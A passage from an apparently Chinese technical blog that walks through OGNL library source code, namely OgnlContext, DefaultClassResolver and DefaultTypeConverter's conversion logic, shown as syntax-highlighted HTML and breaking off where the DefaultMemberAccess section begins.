</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">OgnlContext</span> <span class="kd">extends</span> <span class="n">Object</span> <span class="kd">implements</span> <span class="n">Map</span>
<span class="o">{</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">CONTEXT_CONTEXT_KEY</span> <span class="o">=</span> <span class="s">&#34;context&#34;</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">ROOT_CONTEXT_KEY</span> <span class="o">=</span> <span class="s">&#34;root&#34;</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">THIS_CONTEXT_KEY</span> <span class="o">=</span> <span class="s">&#34;this&#34;</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">TRACE_EVALUATIONS_CONTEXT_KEY</span> <span class="o">=</span> <span class="s">&#34;_traceEvaluations&#34;</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">LAST_EVALUATION_CONTEXT_KEY</span> <span class="o">=</span> <span class="s">&#34;_lastEvaluation&#34;</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">KEEP_LAST_EVALUATION_CONTEXT_KEY</span> <span class="o">=</span> <span class="s">&#34;_keepLastEvaluation&#34;</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">CLASS_RESOLVER_CONTEXT_KEY</span> <span class="o">=</span> <span class="s">&#34;_classResolver&#34;</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">TYPE_CONVERTER_CONTEXT_KEY</span> <span class="o">=</span> <span class="s">&#34;_typeConverter&#34;</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">MEMBER_ACCESS_CONTEXT_KEY</span> <span class="o">=</span> <span class="s">&#34;_memberAccess&#34;</span><span class="o">;</span>

    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">PROPERTY_KEY_PREFIX</span> <span class="o">=</span> <span class="s">&#34;ognl&#34;</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="n">DEFAULT_TRACE_EVALUATIONS</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="n">DEFAULT_KEEP_LAST_EVALUATION</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">ClassResolver</span> <span class="n">DEFAULT_CLASS_RESOLVER</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DefaultClassResolver</span><span class="o">();</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">TypeConverter</span> <span class="n">DEFAULT_TYPE_CONVERTER</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DefaultTypeConverter</span><span class="o">();</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">MemberAccess</span> <span class="n">DEFAULT_MEMBER_ACCESS</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DefaultMemberAccess</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
    
    <span class="kd">private</span> <span class="kd">static</span> <span class="n">Map</span> <span class="n">RESERVED_KEYS</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">(</span><span class="n">11</span><span class="o">);</span>
    
    <span class="kd">private</span> <span class="n">Object</span> <span class="n">_root</span><span class="o">;</span>
    <span class="kd">private</span> <span class="n">Object</span> <span class="n">_currentObject</span><span class="o">;</span>
    <span class="kd">private</span> <span class="n">Node</span> <span class="n">_currentNode</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kt">boolean</span> <span class="n">_traceEvaluations</span> <span class="o">=</span> <span class="n">DEFAULT_TRACE_EVALUATIONS</span><span class="o">;</span>
    <span class="kd">private</span> <span class="n">Evaluation</span> <span class="n">_rootEvaluation</span><span class="o">;</span>
    <span class="kd">private</span> <span class="n">Evaluation</span> <span class="n">_currentEvaluation</span><span class="o">;</span>
    <span class="kd">private</span> <span class="n">Evaluation</span> <span class="n">_lastEvaluation</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kt">boolean</span> <span class="n">_keepLastEvaluation</span> <span class="o">=</span> <span class="n">DEFAULT_KEEP_LAST_EVALUATION</span><span class="o">;</span>
    
    <span class="kd">private</span> <span class="n">Map</span> <span class="n">_values</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">(</span><span class="n">23</span><span class="o">);</span>
    
    <span class="kd">private</span> <span class="n">ClassResolver</span> <span class="n">_classResolver</span> <span class="o">=</span> <span class="n">DEFAULT_CLASS_RESOLVER</span><span class="o">;</span>
    <span class="kd">private</span> <span class="n">TypeConverter</span> <span class="n">_typeConverter</span> <span class="o">=</span> <span class="n">DEFAULT_TYPE_CONVERTER</span><span class="o">;</span>
    <span class="kd">private</span> <span class="n">MemberAccess</span> <span class="n">_memberAccess</span> <span class="o">=</span> <span class="n">DEFAULT_MEMBER_ACCESS</span><span class="o">;</span></code></pre></td></tr></table>
</div>
</div>
<p>DefaultClassResolver 实现代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">DefaultClassResolver</span> <span class="kd">extends</span> <span class="n">Object</span> <span class="kd">implements</span> <span class="n">ClassResolver</span>
<span class="o">{</span>
    <span class="kd">private</span> <span class="n">Map</span>     <span class="n">classes</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">(</span><span class="n">101</span><span class="o">);</span>

    <span class="kd">public</span> <span class="nf">DefaultClassResolver</span><span class="o">()</span>
    <span class="o">{</span>
        <span class="kd">super</span><span class="o">();</span>
    <span class="o">}</span>

  <span class="kd">public</span> <span class="n">Class</span> <span class="nf">classForName</span><span class="o">(</span><span class="n">String</span> <span class="n">className</span><span class="o">,</span> <span class="n">Map</span> <span class="n">context</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ClassNotFoundException</span>
  <span class="o">{</span>
      <span class="n">Class</span>       <span class="n">result</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

        <span class="k">if</span> <span class="o">((</span><span class="n">result</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">)</span><span class="n">classes</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">className</span><span class="o">))</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">className</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
          <span class="k">if</span> <span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="sc">&#39;.&#39;</span><span class="o">)</span> <span class="o">==</span> <span class="o">-</span><span class="n">1</span><span class="o">)</span> <span class="o">{</span>
              <span class="n">result</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;java.lang.&#34;</span> <span class="o">+</span> <span class="n">className</span><span class="o">);</span>
              <span class="n">classes</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;java.lang.&#34;</span> <span class="o">+</span> <span class="n">className</span><span class="o">,</span> <span class="n">result</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span>
      <span class="n">classes</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">className</span><span class="o">,</span> <span class="n">result</span><span class="o">);</span>
      <span class="o">}</span>
      <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
  <span class="o">}</span>
<span class="o">}</span></code></pre></td></tr></table>
</div>
</div>
<p>DefaultTypeConverter 实现代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">DefaultTypeConverter</span> <span class="kd">implements</span> <span class="n">TypeConverter</span>
<span class="o">{</span>
    <span class="kd">public</span> <span class="nf">DefaultTypeConverter</span><span class="o">()</span>
    <span class="o">{</span>
        <span class="kd">super</span><span class="o">();</span>
    <span class="o">}</span>

    <span class="c1">// 调用了OgnlOps的converValue进行类型转换
</span><span class="c1"></span>    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">convertValue</span><span class="o">(</span><span class="n">Map</span> <span class="n">context</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">,</span> <span class="n">Class</span> <span class="n">toType</span><span class="o">)</span>
    <span class="o">{</span>
        <span class="k">return</span> <span class="n">OgnlOps</span><span class="o">.</span><span class="na">convertValue</span><span class="o">(</span><span class="n">value</span><span class="o">,</span> <span class="n">toType</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">convertValue</span><span class="o">(</span><span class="n">Map</span> <span class="n">context</span><span class="o">,</span> <span class="n">Object</span> <span class="n">target</span><span class="o">,</span> <span class="n">Member</span> <span class="n">member</span><span class="o">,</span> <span class="n">String</span> <span class="n">propertyName</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">,</span> <span class="n">Class</span> <span class="n">toType</span><span class="o">)</span>
    <span class="o">{</span>
        <span class="k">return</span> <span class="n">convertValue</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">value</span><span class="o">,</span> <span class="n">toType</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>


<span class="c1">// 看一下 OgnlOps 的代码
</span><span class="c1"></span><span class="kd">public</span> <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">OgnlOps</span> <span class="kd">implements</span> <span class="n">NumericTypes</span>
<span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">convertValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">value</span><span class="o">,</span> <span class="n">Class</span> <span class="n">toType</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">preventNulls</span><span class="o">)</span>
    <span class="o">{</span>
        <span class="n">Object</span> <span class="n">result</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        
        <span class="k">if</span> <span class="o">(</span><span class="n">value</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">toType</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">value</span><span class="o">.</span><span class="na">getClass</span><span class="o">()))</span>
            <span class="k">return</span> <span class="n">value</span><span class="o">;</span>
        
        <span class="k">if</span> <span class="o">(</span><span class="n">value</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="cm">/* If array -&gt; array then convert components of array individually */</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">value</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">isArray</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="n">toType</span><span class="o">.</span><span class="na">isArray</span><span class="o">())</span> <span class="o">{</span>
                <span class="n">Class</span> <span class="n">componentType</span> <span class="o">=</span> <span class="n">toType</span><span class="o">.</span><span class="na">getComponentType</span><span class="o">();</span>

                <span class="n">result</span> <span class="o">=</span> <span class="n">Array</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">componentType</span><span class="o">,</span> <span class="n">Array</span><span class="o">.</span><span class="na">getLength</span><span class="o">(</span><span class="n">value</span><span class="o">));</span>
                <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">,</span> <span class="n">icount</span> <span class="o">=</span> <span class="n">Array</span><span class="o">.</span><span class="na">getLength</span><span class="o">(</span><span class="n">value</span><span class="o">);</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">icount</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
                    <span class="n">Array</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">result</span><span class="o">,</span> <span class="n">i</span><span class="o">,</span> <span class="n">convertValue</span><span class="o">(</span><span class="n">Array</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">value</span><span class="o">,</span> <span class="n">i</span><span class="o">),</span> <span class="n">componentType</span><span class="o">));</span>
                <span class="o">}</span>
            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">value</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">isArray</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">toType</span><span class="o">.</span><span class="na">isArray</span><span class="o">())</span> <span class="o">{</span>
                
                <span class="k">return</span> <span class="n">convertValue</span><span class="o">(</span><span class="n">Array</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">value</span><span class="o">,</span> <span class="n">0</span><span class="o">),</span> <span class="n">toType</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(!</span><span class="n">value</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">isArray</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="n">toType</span><span class="o">.</span><span class="na">isArray</span><span class="o">()){</span>
                
                <span class="k">if</span> <span class="o">(</span><span class="n">toType</span><span class="o">.</span><span class="na">getComponentType</span><span class="o">()</span> <span class="o">==</span> <span class="n">Character</span><span class="o">.</span><span class="na">TYPE</span><span class="o">)</span> <span class="o">{</span>

                    <span class="n">result</span> <span class="o">=</span> <span class="n">stringValue</span><span class="o">(</span><span class="n">value</span><span class="o">).</span><span class="na">toCharArray</span><span class="o">();</span>
                <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">toType</span><span class="o">.</span><span class="na">getComponentType</span><span class="o">()</span> <span class="o">==</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
                    <span class="k">return</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span> <span class="o">{</span> <span class="n">value</span> <span class="o">};</span>
                <span class="o">}</span>
            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">((</span><span class="n">toType</span> <span class="o">==</span> <span class="n">Integer</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">||</span> <span class="o">(</span><span class="n">toType</span> <span class="o">==</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">))</span> <span class="o">{</span>
                    <span class="n">result</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Integer</span><span class="o">((</span><span class="kt">int</span><span class="o">)</span> <span class="n">longValue</span><span class="o">(</span><span class="n">value</span><span class="o">));</span>
                <span class="o">}</span>
                <span class="k">if</span> <span class="o">((</span><span class="n">toType</span> <span class="o">==</span> <span class="n">Double</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">||</span> <span class="o">(</span><span class="n">toType</span> <span class="o">==</span> <span class="n">Double</span><span class="o">.</span><span class="na">TYPE</span><span class="o">))</span> <span class="n">result</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Double</span><span class="o">(</span><span class="n">doubleValue</span><span class="o">(</span><span class="n">value</span><span class="o">));</span>
                <span class="k">if</span> <span class="o">((</span><span class="n">toType</span> <span class="o">==</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">||</span> <span class="o">(</span><span class="n">toType</span> <span class="o">==</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">TYPE</span><span class="o">))</span>
                    <span class="n">result</span> <span class="o">=</span> <span class="n">booleanValue</span><span class="o">(</span><span class="n">value</span><span class="o">)</span> <span class="o">?</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">TRUE</span> <span class="o">:</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">FALSE</span><span class="o">;</span>
                <span class="k">if</span> <span class="o">((</span><span class="n">toType</span> <span class="o">==</span> <span class="n">Byte</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">||</span> <span class="o">(</span><span class="n">toType</span> <span class="o">==</span> <span class="n">Byte</span><span class="o">.</span><span class="na">TYPE</span><span class="o">))</span> <span class="n">result</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Byte</span><span class="o">((</span><span class="kt">byte</span><span class="o">)</span> <span class="n">longValue</span><span class="o">(</span><span class="n">value</span><span class="o">));</span>
                <span class="k">if</span> <span class="o">((</span><span class="n">toType</span> <span class="o">==</span> <span class="n">Character</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">||</span> <span class="o">(</span><span class="n">toType</span> <span class="o">==</span> <span class="n">Character</span><span class="o">.</span><span class="na">TYPE</span><span class="o">))</span>
                    <span class="n">result</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Character</span><span class="o">((</span><span class="kt">char</span><span class="o">)</span> <span class="n">longValue</span><span class="o">(</span><span class="n">value</span><span class="o">));</span>
                <span class="k">if</span> <span class="o">((</span><span class="n">toType</span> <span class="o">==</span> <span class="n">Short</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">||</span> <span class="o">(</span><span class="n">toType</span> <span class="o">==</span> <span class="n">Short</span><span class="o">.</span><span class="na">TYPE</span><span class="o">))</span> <span class="n">result</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Short</span><span class="o">((</span><span class="kt">short</span><span class="o">)</span> <span class="n">longValue</span><span class="o">(</span><span class="n">value</span><span class="o">));</span>
                <span class="k">if</span> <span class="o">((</span><span class="n">toType</span> <span class="o">==</span> <span class="n">Long</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">||</span> <span class="o">(</span><span class="n">toType</span> <span class="o">==</span> <span class="n">Long</span><span class="o">.</span><span class="na">TYPE</span><span class="o">))</span> <span class="n">result</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Long</span><span class="o">(</span><span class="n">longValue</span><span class="o">(</span><span class="n">value</span><span class="o">));</span>
                <span class="k">if</span> <span class="o">((</span><span class="n">toType</span> <span class="o">==</span> <span class="n">Float</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">||</span> <span class="o">(</span><span class="n">toType</span> <span class="o">==</span> <span class="n">Float</span><span class="o">.</span><span class="na">TYPE</span><span class="o">))</span> <span class="n">result</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Float</span><span class="o">(</span><span class="n">doubleValue</span><span class="o">(</span><span class="n">value</span><span class="o">));</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">toType</span> <span class="o">==</span> <span class="n">BigInteger</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="n">result</span> <span class="o">=</span> <span class="n">bigIntValue</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">toType</span> <span class="o">==</span> <span class="n">BigDecimal</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="n">result</span> <span class="o">=</span> <span class="n">bigDecValue</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">toType</span> <span class="o">==</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="n">result</span> <span class="o">=</span> <span class="n">stringValue</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">toType</span><span class="o">.</span><span class="na">isPrimitive</span><span class="o">())</span> <span class="o">{</span>
                <span class="n">result</span> <span class="o">=</span> <span class="n">OgnlRuntime</span><span class="o">.</span><span class="na">getPrimitiveDefaultValue</span><span class="o">(</span><span class="n">toType</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">preventNulls</span> <span class="o">&amp;&amp;</span> <span class="n">toType</span> <span class="o">==</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">result</span> <span class="o">=</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">FALSE</span><span class="o">;</span>
            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">preventNulls</span> <span class="o">&amp;&amp;</span> <span class="n">Number</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">toType</span><span class="o">)){</span>
                <span class="n">result</span> <span class="o">=</span> <span class="n">OgnlRuntime</span><span class="o">.</span><span class="na">getNumericDefaultValue</span><span class="o">(</span><span class="n">toType</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span>
        
        <span class="k">if</span> <span class="o">(</span><span class="n">result</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">preventNulls</span><span class="o">)</span>
            <span class="k">return</span> <span class="n">value</span><span class="o">;</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">value</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">result</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            
            <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="s">&#34;Unable to convert type &#34;</span> <span class="o">+</span> <span class="n">value</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34; of &#34;</span> <span class="o">+</span> <span class="n">value</span> <span class="o">+</span> <span class="s">&#34; to type of &#34;</span> <span class="o">+</span> <span class="n">toType</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
    <span class="o">}</span></code></pre></td></tr></table>
</div>
</div>
<p>DefaultMemberAccess 实现代码： 默认禁止访问private、protected、package protected的访问</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span></code></pre></td>
<td class="lntd">
